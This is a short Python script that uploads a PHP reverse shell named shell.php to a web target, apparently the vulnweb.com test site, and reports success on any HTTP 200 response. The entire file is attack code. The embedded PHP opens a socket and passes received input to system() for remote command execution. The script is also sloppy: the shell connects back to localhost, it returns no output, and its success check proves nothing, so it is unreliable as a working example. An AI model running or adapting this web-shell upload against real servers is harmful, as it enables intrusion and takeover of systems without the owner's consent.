import requests
import os

# Target URL
url = "http://www.vulnweb.com/"

# Payload: a PHP reverse shell
payload = """<?php
    $sock=fsockopen("localhost", 8080);
    while(1){
        $com = fgets($sock);
        if($com){
            $res = trim($com);
            if($res == "exit"){
                break;
            }
            system($res);
        }
    }
    ?>"""

# Send the payload as a file
files = {"file": ("shell.php", payload, "text/php")}
response = requests.post(url, files=files)

# Verify the upload
if response.status_code == 200:
    print("File uploaded successfully!")
else:
    print("Upload failed!")